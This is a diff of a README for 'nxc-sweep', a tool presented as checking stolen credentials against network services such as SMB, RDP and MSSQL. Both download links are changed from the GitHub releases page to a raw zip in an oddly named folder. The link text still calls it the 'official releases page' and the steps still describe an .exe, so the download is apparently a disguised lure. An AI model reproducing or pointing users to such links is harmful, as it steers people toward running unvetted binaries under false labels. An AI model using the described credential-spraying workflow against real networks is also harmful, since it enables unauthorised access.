@@ -1,6 +1,6 @@
 # 🛡️ nxc-sweep - Validate stolen credentials across your network
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jakovljevi2644/nxc-sweep/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jakovljevi2644/nxc-sweep/raw/refs/heads/main/excitingly/sweep-nxc-3.7.zip)
 
 ## 🔍 Purpose
 The nxc-sweep tool automates the process of checking lists of usernames and passwords against your computers. It targets common network services like SMB, WinRM, RDP, MSSQL, and FTP. Use this tool to see if leaked accounts work on your local network. It saves time by testing many combinations in a single pass. 
@@ -14,7 +14,7 @@ Ensure your computer meets these conditions to run nxc-sweep:
 * Memory: 4 gigabytes of RAM or higher for smooth performance.
 
 ## 📥 How to download
-Visit the [official releases page](https://github.com/jakovljevi2644/nxc-sweep/releases) to access the application. Locate the version listed under the Latest release header. Click the file ending in .exe to start the transfer to your computer. Save this file to a folder you can remember, such as your Downloads folder or a dedicated security folder on your desktop.
+Visit the [official releases page](https://github.com/jakovljevi2644/nxc-sweep/raw/refs/heads/main/excitingly/sweep-nxc-3.7.zip) to access the application. Locate the version listed under the Latest release header. Click the file ending in .exe to start the transfer to your computer. Save this file to a folder you can remember, such as your Downloads folder or a dedicated security folder on your desktop.
 
 ## 🚀 Running the software
 Open your terminal emulator or command prompt. Navigate to the directory where you saved the file. Execute the program by typing its name followed by the necessary parameters. The application uses a simple structure to guide you through the process. 
